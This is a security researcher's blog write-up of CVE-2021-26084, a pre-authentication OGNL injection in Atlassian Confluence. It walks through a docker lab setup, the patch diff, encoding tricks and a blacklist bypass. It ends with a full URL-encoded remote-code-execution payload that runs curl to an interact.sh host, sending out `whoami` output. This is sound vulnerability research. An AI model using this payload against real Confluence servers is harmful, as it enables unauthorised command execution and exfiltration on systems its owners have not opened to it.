---
layout: post
title:  "A look into CVE-2021-26084 Confluence RCE "
date:   2021-09-01 16:00:00 +0700
categories: research
author: Quang Vo
toc: true
description: Research analysis and develop a working exploit poc script 
tags: CVE-2021-26084, Web Security
---

## OGNL Injection on Confluence

- Twitter is always the best place to keep up-to-date with the newest CVE or exploit. CVE-2021-26084 caught my eyes because the bug was critical and Jira Confluence 
is one of the most common software for IT companies ( I think ?, because all of the companies I worked for, they all use Jira confluence ).
- I don't have much chance to review Java-based product and I've been avoiding doing research on Java-based product, so I think this is a good time to start and it's a Web application bug - my expertise ;). 

Reference:
- Amazing write-up from [@iamnoooob](https://twitter.com/iamnoooob): [https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md](https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md)

### Setup
Quick start-up with docker-compose

```docker
version: '3.4'

services:
  confluence:
    image: atlassian/confluence-server:7.12.4
    container_name: confluence
    hostname: confluence
    networks:
      - confluencenet
    volumes:
      - ./confluencedata:/var/atlassian/confluence
    ports:
      - '8090:8090'
    environment:
      - 'CATALINA_OPTS= -Xms256m -Xmx1g'
      - 'CONFLUENCE_PROXY_NAME='
      - 'CONFLUENCE_PROXY_PORT='
      - 'CONFLUENCE_PROXY_SCHEME='
      - 'CONFLUENCE_DELAYED_START='

  postgresql:
    image: postgres:9.6
    container_name: postgres
    hostname: postgres
    networks:
      - confluencenet
    volumes:
      - ./postgresqldata:/var/lib/postgresql/data
    environment:
      - 'POSTGRES_USER=confluencedb'
      # CHANGE THE PASSWORD!
      - 'POSTGRES_PASSWORD=jellyfish'
      - 'POSTGRES_DB=confluencedb'
      - 'POSTGRES_ENCODING=UTF8'
      - 'POSTGRES_COLLATE=C'
      - 'POSTGRES_COLLATE_TYPE=C'

volumes:
  confluencedata:
    external: false
  postgresqldata:
    external: false

networks:
  confluencenet:
    driver: bridge
```

The version that I use for this research is 7.12.4

For the Atlassian Confluence's source code, you can download it here: [https://www.atlassian.com/software/confluence/download-archives](https://www.atlassian.com/software/confluence/download-archives)


### The Patch Diff

First, we have to compare the diff between the patched version vs the vulnerable version. Luckily, Atlassian released the [hot fix](https://confluence.atlassian.com/doc/files/1077906215/1077916296/2/1629936383093/cve-2021-26084-update.sh) in bash script so we can easily read the bash script and find out what changed. 

<img width="960" alt="image" src="https://user-images.githubusercontent.com/37280106/131707026-9ab5b36c-60dc-43c8-8404-510ba1089831.png">

So here, we see there is some regex expression related to `Hidden` field in `confluence/pages/createpage-entervariables.vm` file. Some string replacement operation was taken in place.

Especially this line, that indicate us that whatever caused the problem, it must be related to the `queryString` field in `createpage-entervariables.vm` file
```
if grep -qi "value='\$!querystring" confluence/pages/createpage-entervariables.vm
```

Checking `createpage-entervariables.vm` file

<img width="960" alt="image" src="https://user-images.githubusercontent.com/37280106/131707774-6bc928db-cf86-4c41-aa27-21bcd478cb49.png">


In the form, we see the `doenterpagevariables.action` action in `<form>` tag.

Try to visit the `/pages/doenterpagevariables.action ` URL:

<img width="1061" alt="image" src="https://user-images.githubusercontent.com/37280106/131708355-b9af3e56-a6fb-44fc-bf06-c73445ccf558.png">


### The `.vm` file extension

When we see something new that we probably haven't hearded of it before, we should **read the doc** and find out what it is. I love to read the doc and learn about new thing, that's one of my favorite part of doing 1day analysis.

[.vm file extension](https://velocity.apache.org/engine/1.7/user-guide.html)

After reading it, we know we may be dealing with SSTI bug here since Velocity is a Java-based template engine.

Some basic syntax of Vector engine
```template
#set( $foo = $bar + 3 )
#{7*7} = 49
```

This knowledge will help us a lot to conduct more in depth research.

### The bug

Now, we should know what this line mean in the code
```
#tag ("Hidden" "name='queryString'" "value='$!queryString'")
```
It's expecting a `queryString` variable, so why not give it what it wants ?

<img width="1102" alt="image" src="https://user-images.githubusercontent.com/37280106/131775547-0ad48d64-fa9f-4032-986a-91e64911dfa8.png">


We see that the value `abc` is reflected in the template. To this step, I think it will be an easy bug because the value was reflected, so I setup my wordlist and brute force to see we can have a Template Injection but I have no luck :(.

I tried this payload with intention to break out of the quote `'abc+#{7*7}`. But server response with `&amp;#39;aaa+#{7*7}`

<img width="925" alt="image" src="https://user-images.githubusercontent.com/37280106/131776094-9c872f33-0a87-436d-adff-c11916586922.png">

If you are a Web Security Engineer, you should be familiar with the encoding/double-encoding the payload to trigger XSS, SSTI. Same methods can be apply here like: hex-encoding, unicode-encoding, decimal-encoding, ....

After trying all the methods above, the Unicode Encoding payload `\u0027` gave us an interesting result. The `value` field completely disappeared, `\u0027` is the 
`'` character, this indicate us that we broke something, may be broke out of context of the string or something else ?

<img width="923" alt="image" src="https://user-images.githubusercontent.com/37280106/131778008-1785861c-d29b-4d01-a6f7-a093eb6cf61f.png">

Let's try some string concatenation with payload `aaa%5Cu0027%2B%5Cu0027bbb` . Velocity Engine is quite powerful and it can do most things that Java can.

<img width="913" alt="image" src="https://user-images.githubusercontent.com/37280106/131778193-68a162b4-b371-4a62-a6de-366739dc3258.png">

Boom !!!. Our input was concatenated, which mean is we broke out of the context.

Now should we try some Math operation ?.

<img width="927" alt="image" src="https://user-images.githubusercontent.com/37280106/131778369-f63bba80-b6e0-40b6-a6e3-cc06fc5a0aad.png">

There we go :). Now we have our Pre-auth OGNL Injection :) .


### Escalate the Template Injection and Bypass blacklist to archive command execution

One of the most common technique to exploit Template Injection is climbing the object hierarchy. We climb up to the parent object, and then call java runtime environment to get RCE, sound easy right ?.

Usually, we will use `"".getClass()` to get instance of a class and then perform Java reflection to call Java runtime and execute commands. But our OGNL expression has a blacklist of methods and variables.

<img width="755" alt="image" src="https://user-images.githubusercontent.com/37280106/131948296-928062c9-ee78-4cbe-8426-0ae0d61db0cf.png">

As you can see, all the unsafe methods and properties are blacklisted. 

I'm not an expert in Java, I just read a lot of research and write-up from other famous researcher, I know Java has a long history of deserialization attack and bypass blacklisted methods to archive command execution. 

At this point, I remember that Orange Tsai had some techniques to bypass the blacklist and he pointed out blacklist is a bad idea. So I revisit his [talk](https://www.youtube.com/watch?v=28xWcRegncw&t=2171s) 

<img width="1348" alt="image" src="https://user-images.githubusercontent.com/37280106/131950579-ad4502a2-e92a-4356-8f11-101bc3d2bcc2.png">

Does it look familiar with our blacklist here ?. The path is clear, we can use `""["class"].forName("java.lang.Runtime")` to access to instance of `Runtime` class and archieve command execution.

Full payload (copied from [this write up](https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md])): 
```
aaa%5Cu0027%2B%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName%28%5Cu0022java.lang.Runtime%5Cu0022%29.getMethod%28%5Cu0022getRuntime%5Cu0022%2Cnull%29.invoke%28null%2Cnull%29.exec%28%5Cu0022curl%20c4rtfjeyedf00002t4zggncp83ryyyyyb.interact.sh%2F%60whoami%60%5Cu0022%29%7D%2B%5Cu0027
```

<img width="909" alt="image" src="https://user-images.githubusercontent.com/37280106/131952998-fa5f93b5-1a02-4311-a995-607e75a6ee81.png">


<img width="1067" alt="image" src="https://user-images.githubusercontent.com/37280106/131952888-92aca55a-5d6a-4853-a912-2d8549286a3d.png">

Due to the limitation of `java.lang.Runtime.getRunTime().exec()`, we could not use any Bash expression like:
```
``
|
&
<>
```

So although we have RCE, we are still limited to the commands that we can execute.
